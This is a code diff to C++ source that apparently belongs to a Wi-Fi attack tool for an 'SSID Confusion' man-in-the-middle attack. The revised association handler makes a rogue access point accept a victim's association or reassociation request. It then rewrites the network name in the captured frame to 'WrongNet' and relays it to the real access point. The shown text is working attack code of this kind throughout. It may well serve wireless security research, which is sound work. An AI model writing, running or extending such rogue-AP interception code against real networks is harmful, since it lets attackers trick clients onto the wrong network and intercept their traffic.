@@ -70,74 +70,43 @@ FrameProcess SsidConfusion::handle_eapol_rogue(const HWAddress<6> addr2, const P
 	}
 	return CONTINUE;
 }
+FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot11, const frame_raw_t &raw) {
+	using R = Dot11ManagementFrame::rates_type::value_type;
+	static const Dot11ManagementFrame::rates_type rates = {
+		static_cast<R>(82),
+		static_cast<R>(84),
+		static_cast<R>(139),
+		static_cast<R>(150),
+		static_cast<R>(36),
+		static_cast<R>(48),
+		static_cast<R>(72),
+		static_cast<R>(96) };
 
-
-void rewrite_ssid_in_frame(vector<uint8_t> &raw, const string &new_ssid) {
-	if(raw.size() < 6) return;
-	const uint16_t rt_len = static_cast<uint16_t>(raw[2]) | (raw[3] << 8);
-
-	// 802.11 mgmt header = 24 B; AssocReq fixed = 4 B, ReassocReq fixed = 10 B
-	const uint8_t subtype = (raw[rt_len] >> 4) & 0x0F;
-	const size_t fixed = (subtype == 2) ? 10 : 4;
-	const size_t ie_start = rt_len + 24 + fixed;
-
-	if(raw.size() < ie_start + 2) return;
-
-	for(size_t i = ie_start; i + 1 < raw.size(); ) {
-		if(raw[i] == 0) {  // SSID IE
-			const size_t old_len = raw[i + 1];
-			const size_t new_len = min(new_ssid.size(), (size_t)32);
-			raw.erase(raw.begin() + i + 2, raw.begin() + i + 2 + old_len);
-			raw.insert(raw.begin() + i + 2,
-				reinterpret_cast<const uint8_t*>(new_ssid.data()),
-				reinterpret_cast<const uint8_t*>(new_ssid.data()) + new_len);
-			raw[i + 1] = static_cast<uint8_t>(new_len);
-			return;
-		}
-		i += 2 + raw[i + 1];
-	}
-}
-
-FrameProcess SsidConfusion::handle_assoc_request(const HWAddress<6> &addr2, Dot11 &dot11,  const vector<uint8_t> &raw) const {
-	const Dot11ManagementFrame::rates_type rates = {
-		static_cast<Dot11ManagementFrame::rates_type::value_type>(82),
-		static_cast<Dot11ManagementFrame::rates_type::value_type>(84),
-		static_cast<Dot11ManagementFrame::rates_type::value_type>(139),
-		static_cast<Dot11ManagementFrame::rates_type::value_type>(150),
-		static_cast<Dot11ManagementFrame::rates_type::value_type>(36),
-		static_cast<Dot11ManagementFrame::rates_type::value_type>(48),
-		static_cast<Dot11ManagementFrame::rates_type::value_type>(72),
-		static_cast<Dot11ManagementFrame::rates_type::value_type>(96),
+	auto fill_resp = [&](auto &resp, const auto &req) {
+		resp.addr3(rogue_ap.get(SK::mac));
+		resp.status_code(0);
+		resp.capabilities() = req.capabilities();
+		resp.aid(1);
+		resp.supported_rates(rates);
+		send_to_rogue(resp);
 	};
 
 	if(const auto *assoc = dot11.find_pdu<Dot11AssocRequest>()) {
 		Dot11AssocResponse resp(addr2, rogue_ap.get(SK::mac));
-		resp.status_code(0);
-		resp.capabilities() = assoc->capabilities();
-		resp.aid(1);
-		resp.supported_rates(rates);
-		send_to_rogue(resp);
+		fill_resp(resp, *assoc);
 	} else if(const auto *reassoc = dot11.find_pdu<Dot11ReAssocRequest>()) {
 		Dot11ReAssocResponse resp(addr2, rogue_ap.get(SK::mac));
-		resp.addr3(rogue_ap.get(SK::mac));
-		resp.status_code(0);
-		resp.capabilities() = reassoc->capabilities();
-		resp.aid(1);
-		resp.supported_rates(rates);
-		send_to_rogue(resp);
+		fill_resp(resp, *reassoc);
 	} else {
 		return CONTINUE;
 	}
-	//client_state.update_state(ClientState::Associated);
-	display_traffic(dot11, "Rogue channel", " -- Replied");
 
-	auto translated = raw;
+	display_traffic(dot11, "Rogue channel", " -- Replied and MitMing with WrongNe"); //TODO hardcoded name
+
+	auto translated = ensure_radiotap(raw);
 	rewrite_ssid_in_frame(translated, "WrongNet"); //TODO hardcoded
-	translate_data_mac(translated, rogue_ap->get(SK::mac), ap->get(SK::mac));
 
-	log(LogLevel::DEBUG, "Forwarding Assoc to Real AP with WrongNet SSID");
-	sock_real->send(translated, netconfig.real_channel);
-
+	send_to_real(translated);
 	return STOP;
 }
 
